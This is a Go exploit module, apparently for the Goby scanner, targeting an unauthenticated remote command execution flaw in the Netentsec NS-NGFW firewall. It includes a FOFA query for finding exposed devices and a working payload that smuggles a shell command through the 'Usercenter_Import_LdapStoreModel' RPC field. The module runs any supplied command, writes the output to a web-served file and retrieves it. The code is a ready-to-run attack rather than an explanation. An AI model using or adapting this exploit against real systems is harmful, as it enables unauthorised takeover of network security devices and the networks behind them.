package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "NS-NGFW Netcom firewall Usercenter_Import_LdapStoreModel Remote Command Execution",
    "Description": "<p>Netcom Next Generation Firewall (NGFW) is a high-performance application layer firewall launched by Netcom Technology that can comprehensively deal with network threats.</p><p>There is an unauthorized rce vulnerability in the Netcom Next Generation Firewall (NGFW), through which an attacker can execute arbitrary code on the server side, write to the backend, obtain server permissions, and control the entire web server.</p>",
    "Impact": "<p>There is an unauthorized command vulnerability in Netents Next Generation Firewall (NGFW). An attacker can use this vulnerability to arbitrarily execute code on the server side, write into the back door, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.netentsec.com/product/lists_265.html\">https://www.netentsec.com/product/lists_265.html</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "Product": "NS-NGFW",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "NS-NGFW 网康防火墙 Usercenter_Import_LdapStoreModel 远程命令执行漏洞",
            "Product": "网康科技-下一代防火墙",
            "Description": "<p>网康下一代防火墙（NGFW）是网康科技推出的一款可全面应对网络威胁的高性能应用层防火墙。</p><p>网康下一代防火墙（NGFW）存在未授权命令漏洞，攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.netentsec.com/product/lists_265.html\">https://www.netentsec.com/product/lists_265.html</a></p><p>1、通过防火墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>网康下一代防火墙（NGFW）存在未授权命令执行漏洞，攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NS-NGFW Netcom firewall Usercenter_Import_LdapStoreModel Remote Command Execution",
            "Product": "NS-NGFW",
            "Description": "<p>Netcom Next Generation Firewall (NGFW) is a high-performance application layer firewall launched by Netcom Technology that can comprehensively deal with network threats.</p><p>There is an unauthorized rce vulnerability in the Netcom Next Generation Firewall (NGFW), through which an attacker can execute arbitrary code on the server side, write to the backend, obtain server permissions, and control the entire web server.</p>",
            "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.netentsec.com/product/lists_265.html\">https://www.netentsec.com/product/lists_265.html</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is an unauthorized command vulnerability in Netents Next Generation Firewall (NGFW). An attacker can use this vulnerability to arbitrarily execute code on the server side, write into the back door, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"网康下一代防火墙\" && body=\"/images/dashboard/dashboard.png\") || banner=\"Netentsec NGFW\"",
    "GobyQuery": "(title=\"网康下一代防火墙\" && body=\"/images/dashboard/dashboard.png\") || banner=\"Netentsec NGFW\"",
    "Author": "liuzhenqi@baimaohui.net",
    "Homepage": "https://www.netentsec.com",
    "DisclosureDate": "2022-08-01",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.2",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.8",
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomHexStr := goutils.RandomHexString(10)
			randFileName := goutils.RandomHexString(5)
			payload := fmt.Sprintf(`{"action":"Usercenter_Import_LdapStoreModel","method":"twoLayersScan","data": ["/var/www/tmp/1.txt;echo '%s'>%s.txt"],"type":"rpc","tid":11,"f8839p7rqtj":"="}`, randomHexStr, randFileName)
			cfg := httpclient.NewPostRequestConfig("/directdata/direct/router")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.VerifyTls = false
			cfg.Data = payload
			if resp1, err1 := httpclient.DoHttpRequest(u, cfg); err1 == nil && strings.Contains(resp1.Utf8Html, "Usercenter_Import_LdapStoreModel") {
				fmt.Println(resp1.Utf8Html)
				time.Sleep(time.Second * 1)
				if resp, err := httpclient.SimpleGet(fmt.Sprintf(u.FixedHostInfo+"/%s.txt", randFileName)); err == nil && strings.Contains(resp.RawBody, randomHexStr) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randFileName := goutils.RandomHexString(5)
			cmdExec := ss.Params["cmd"].(string)
			payload := fmt.Sprintf(`{"action":"Usercenter_Import_LdapStoreModel","method":"twoLayersScan","data": ["/var/www/tmp/1.txt;%s>%s.txt"],"type":"rpc","tid":11,"f8839p7rqtj":"="}`, cmdExec, randFileName)
			cfg := httpclient.NewPostRequestConfig("/directdata/direct/router")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.VerifyTls = false
			cfg.Data = payload
			if resp1, err1 := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err1 == nil {
				fmt.Println(resp1.Utf8Html)
				time.Sleep(time.Second * 1)
				uri1 := "/" + randFileName + ".txt"
				resp2, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri1)
				fmt.Println(expResult.HostInfo.HostInfo + uri1)
				if err == nil && resp2.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp2.Utf8Html
				}
			}
			return expResult
		},
	))
}
